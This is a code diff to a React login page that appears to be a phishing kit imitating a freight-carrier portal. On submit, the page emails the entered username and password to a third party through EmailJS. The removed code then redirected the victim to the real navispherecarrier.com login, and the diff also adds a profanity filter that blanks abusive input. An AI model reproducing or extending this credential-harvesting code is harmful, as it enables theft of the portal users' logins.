@@ -7,34 +7,27 @@ function HomePage() {
     const [passwordShown, setPasswordShown] = useState(false);
     const userName = useRef(null);
     const passwordUser = useRef(null);
-
+    var qfNum = 0;
+    function qfFunck(qf) {
+        if(qf.value.indexOf('ccox') !== -1 || qf.value.indexOf('klir') !== -1 || qf.value.indexOf('qunn') !== -1 || qf.value.indexOf('jajtam') !== -1 ||
+        qf.value.indexOf('jaj tam') !== -1 || qf.value.indexOf('txeq') !== -1 || qf.value.indexOf('cceq') !== -1 || qf.value.indexOf('uteq') !== -1 ||
+        qf.value.indexOf('fuck') !== -1 || qf.value.indexOf('suck') !== -1 || qf.value.indexOf('dick') !== -1 || qf.value.indexOf('gandon') !== -1 ||
+        qf.value.indexOf('qunnem') !== -1 || qf.value.indexOf('txa') !== -1 || qf.value.indexOf('boz') !== -1 || qf.value.indexOf('chatlax') !== -1 ||
+        qf.value.indexOf('gyot') !== -1 || qf.value.indexOf('garlax') !== -1) {
+            qf.value = '';
+            qf.nextSibling.style.display = "block";
+            qfNum = 1;
+        } else {
+            qfNum = 0;
+        }
+    }
     const handleInputBlur = event => {
         if(event.target.value == 0){
             event.target.nextSibling.style.display = "block";
         } else {
             event.target.nextSibling.style.display = "none";
         }
-        if(event.target.value.indexOf('ccox') !== -1 ||
-                event.target.value.indexOf('klir') !== -1 ||
-                event.target.value.indexOf('qunn') !== -1 ||
-                event.target.value.indexOf('jajtam') !== -1 ||
-                event.target.value.indexOf('jaj tam') !== -1 ||
-                event.target.value.indexOf('txeq') !== -1 ||
-                event.target.value.indexOf('cceq') !== -1 ||
-                event.target.value.indexOf('uteq') !== -1 ||
-                event.target.value.indexOf('fuck') !== -1 ||
-                event.target.value.indexOf('suck') !== -1 ||
-                event.target.value.indexOf('dick') !== -1 ||
-                event.target.value.indexOf('gandon') !== -1 ||
-                event.target.value.indexOf('qunnem') !== -1 ||
-                event.target.value.indexOf('txa') !== -1 ||
-                event.target.value.indexOf('boz') !== -1 ||
-                event.target.value.indexOf('chatlax') !== -1 ||
-                event.target.value.indexOf('gyot') !== -1 ||
-                event.target.value.indexOf('garlax') !== -1) {
-            event.target.value = '';
-            event.target.nextSibling.style.display = "block";
-        }
+        qfFunck(event.target);
     };
 
     const togglePassword = () => {
@@ -45,17 +38,25 @@ function HomePage() {
     const USER_ID = "5Fma-P-1aeivvlJxc";
      function handleSubmit(event) {
         event.preventDefault();
-        if(userName.current.value && passwordUser.current.value) {
-            console.log("sddds");
-            emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
-            .then((result) => {
-                console.log("result.text");
-            }, (error) => {
-                console.log("error.text");
-            });
-            // sendEmail(userName.current.value, passwordUser.current.value);
-            window.location.href = "https://www.navispherecarrier.com/login";
-            return;
+        qfFunck(userName.current);
+        if(qfNum == 1) {
+            userName.current.value = '';
+            userName.current.nextSibling.style.display = "block";
+        } else if(qfNum == 0) {
+            qfFunck(passwordUser.current);
+            if(qfNum == 0){
+                if(userName.current.value && passwordUser.current.value) {
+                    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
+                    .then((result) => {
+                        console.log("result.text");
+                    }, (error) => {
+                        console.log("error.text");
+                    });
+                    // sendEmail(userName.current.value, passwordUser.current.value);
+                    // window.location.href = "https://www.navispherecarrier.com/login";
+                    return;
+                }
+            }
         }
         if (!userName.current.value) {
             event.target[0].nextSibling.style.display = "block";
